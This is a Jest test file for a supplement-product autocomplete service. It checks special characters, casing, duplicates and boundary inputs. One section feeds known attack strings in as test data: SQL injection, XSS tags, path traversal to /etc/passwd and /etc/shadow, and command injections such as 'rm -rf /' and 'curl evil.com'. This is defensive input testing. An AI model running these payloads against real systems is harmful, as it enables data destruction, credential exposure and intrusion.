import { autocompleteService } from '../lib/services/autocomplete';

/**
 * Comprehensive edge case tests for autocomplete functionality
 * Tests special characters, security attempts, and boundary conditions
 */
describe('Autocomplete Edge Cases', () => {
  beforeEach(() => {
    // Clear and reinitialize the autocomplete service
    // Note: In a real implementation, you might want to reset the trie
  });

  describe('Special Character Handling', () => {
    test('should handle spaces in product names', async () => {
      autocompleteService.addProduct('jack ed3d');
      const suggestions = autocompleteService.searchProducts('jack');
      expect(suggestions).toContain('jacked3d');
    });

    test('should ignore special characters that are not allowed', async () => {
      autocompleteService.addProduct('jack@ed3d!');
      autocompleteService.addProduct('jack#ed3d$');
      autocompleteService.addProduct('jack%ed3d^');
      
      const suggestions = autocompleteService.searchProducts('jack');
      expect(suggestions).toContain('jacked3d');
    });

    test('should handle mixed valid/invalid characters', async () => {
      autocompleteService.addProduct('jack@3d!');
      const suggestions = autocompleteService.searchProducts('jack');
      expect(suggestions).toContain('jack3d');
    });

    test('should handle empty string gracefully', async () => {
      const suggestions = autocompleteService.searchProducts('');
      expect(suggestions).toEqual([]);
    });

    test('should handle only special characters', async () => {
      autocompleteService.addProduct('@#$%');
      const suggestions = autocompleteService.searchProducts('@#$%');
      expect(suggestions).toEqual([]); // Should be empty since no valid chars
    });

    test('should handle unicode characters', async () => {
      autocompleteService.addProduct('α-test');
      const suggestions = autocompleteService.searchProducts('α');
      expect(suggestions).toContain('α-test');
    });

    test('should handle very long strings', async () => {
      const longString = 'very-long-supplement-name-with-numbers-123-and-symbols-!@#$%';
      autocompleteService.addProduct(longString);
      const suggestions = autocompleteService.searchProducts('very-long-supplement-name-with-numbers-123-and-symbols');
      expect(suggestions).toContain(longString);
    });

    test('should handle case sensitivity correctly', async () => {
      autocompleteService.addProduct('Jacked3D');
      expect(autocompleteService.hasProduct('jacked3d')).toBe(true);
      expect(autocompleteService.hasProduct('JACKED3D')).toBe(true);
      expect(autocompleteService.hasProduct('Jacked3D')).toBe(true);
    });
  });

  describe('Security Attack Prevention', () => {
    test('should handle SQL injection attempts safely', async () => {
      const maliciousInputs = [
        "'; DROP TABLE products; --",
        "1' OR '1'='1",
        "admin'--",
        "'; INSERT INTO users VALUES ('hacker', 'password'); --"
      ];

      for (const input of maliciousInputs) {
        autocompleteService.addProduct(input);
        // Should not crash or cause issues
        const suggestions = autocompleteService.searchProducts('DROP');
        expect(Array.isArray(suggestions)).toBe(true);
      }
    });

    test('should handle XSS attempts safely', async () => {
      const xssInputs = [
        '<script>alert("xss")</script>',
        '<img src=x onerror=alert(1)>',
        'javascript:alert(1)',
        '<iframe src="javascript:alert(1)"></iframe>'
      ];

      for (const input of xssInputs) {
        autocompleteService.addProduct(input);
        // Should not crash or execute scripts
        const suggestions = autocompleteService.searchProducts('script');
        expect(Array.isArray(suggestions)).toBe(true);
      }
    });

    test('should handle path traversal attempts safely', async () => {
      const pathTraversalInputs = [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32',
        '/etc/shadow',
        'C:\\Windows\\System32\\config\\SAM'
      ];

      for (const input of pathTraversalInputs) {
        autocompleteService.addProduct(input);
        // Should not crash or access files
        const suggestions = autocompleteService.searchProducts('etc');
        expect(Array.isArray(suggestions)).toBe(true);
      }
    });

    test('should handle command injection attempts safely', async () => {
      const commandInputs = [
        'product; rm -rf /',
        'supplement | cat /etc/passwd',
        'test && curl evil.com',
        'name$(whoami)'
      ];

      for (const input of commandInputs) {
        autocompleteService.addProduct(input);
        // Should not crash or execute commands
        const suggestions = autocompleteService.searchProducts('product');
        expect(Array.isArray(suggestions)).toBe(true);
      }
    });
  });

  describe('Boundary Conditions', () => {
    test('should handle extremely long input strings', async () => {
      const veryLongString = 'a'.repeat(10000);
      autocompleteService.addProduct(veryLongString);
      expect(autocompleteService.hasProduct(veryLongString)).toBe(true);
    });

    test('should handle null and undefined inputs gracefully', async () => {
      // TypeScript will prevent these at compile time, but test runtime behavior
      expect(() => autocompleteService.searchProducts(null as any)).toThrow();
      expect(() => autocompleteService.searchProducts(undefined as any)).toThrow();
    });

    test('should handle numeric inputs', async () => {
      autocompleteService.addProduct('123');
      autocompleteService.addProduct('456');
      expect(autocompleteService.hasProduct('123')).toBe(true);
      expect(autocompleteService.hasProduct('456')).toBe(true);
    });

    test('should handle special supplement characters correctly', async () => {
      const supplementNames = [
        '5-HTP',
        'L-Arginine',
        'D3',
        'B12',
        'K2',
        'N.O.-Xplode',
        'C4',
        'ISO-100'
      ];

      for (const name of supplementNames) {
        autocompleteService.addProduct(name);
        expect(autocompleteService.hasProduct(name.toLowerCase())).toBe(true);
      }
    });

    test('should handle duplicate entries correctly', async () => {
      autocompleteService.addProduct('protein');
      autocompleteService.addProduct('protein'); // Duplicate
      autocompleteService.addProduct('PROTEIN'); // Case variant
      
      const suggestions = autocompleteService.searchProducts('pro');
      const proteinCount = suggestions.filter(s => s.toLowerCase() === 'protein').length;
      expect(proteinCount).toBe(1); // Should not have duplicates
    });
  });

  describe('Performance Under Stress', () => {
    test('should handle many special character variations', async () => {
      const baseProduct = 'test-product';
      const variations = [
        'test-product',
        'test@product',
        'test#product',
        'test$product',
        'test%product',
        'test^product',
        'test&product',
        'test*product',
        'test(product',
        'test)product'
      ];

      for (const variation of variations) {
        autocompleteService.addProduct(variation);
      }

      const suggestions = autocompleteService.searchProducts('test');
      expect(suggestions).toContain('test-product');
    });

    test('should handle rapid successive additions', async () => {
      const products = Array.from({ length: 1000 }, (_, i) => `product-${i}`);
      
      for (const product of products) {
        autocompleteService.addProduct(product);
      }

      const suggestions = autocompleteService.searchProducts('product-5');
      expect(suggestions.length).toBeGreaterThan(0);
    });
  });

  describe('Input Validation Edge Cases', () => {
    test('should handle whitespace-only strings', async () => {
      autocompleteService.addProduct('   ');
      autocompleteService.addProduct('\t\t');
      autocompleteService.addProduct('\n\n');
      
      const suggestions = autocompleteService.searchProducts(' ');
      expect(suggestions).toEqual([]);
    });

    test('should handle strings with only hyphens and dots', async () => {
      autocompleteService.addProduct('---');
      autocompleteService.addProduct('...');
      autocompleteService.addProduct('-.-');
      
      const suggestions = autocompleteService.searchProducts('-');
      expect(suggestions).toEqual([]);
    });

    test('should handle mixed case with numbers', async () => {
      autocompleteService.addProduct('Jack3d');
      autocompleteService.addProduct('JACK3D');
      autocompleteService.addProduct('jack3D');
      
      expect(autocompleteService.hasProduct('jack3d')).toBe(true);
      expect(autocompleteService.hasProduct('JACK3D')).toBe(true);
      expect(autocompleteService.hasProduct('Jack3d')).toBe(true);
    });
  });
});
